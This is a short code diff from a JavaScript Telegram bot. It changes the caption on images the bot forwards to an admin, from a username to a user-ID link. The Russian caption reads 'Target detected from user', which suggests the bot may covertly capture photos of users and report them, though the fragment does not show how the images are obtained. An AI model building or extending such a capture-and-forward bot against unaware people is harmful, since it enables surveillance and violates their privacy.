@@ -59,7 +59,7 @@ function base64(img, id_t) {
       bot.telegram.sendMediaGroup(admin, [
         {
           type: "photo",
-          caption: `<b>🕵️♂️ Цель обнаружена от пользователя @${res.username}! </b>`,
+          caption: `<b>🕵️♂️ Цель обнаружена от пользователя tg://user?id=${res.id} </b>`,
           parse_mode: "HTML",
           media: { source: `public/${current_name}.png` },
           //media:`http://localhost:3000/${current_name}.png`
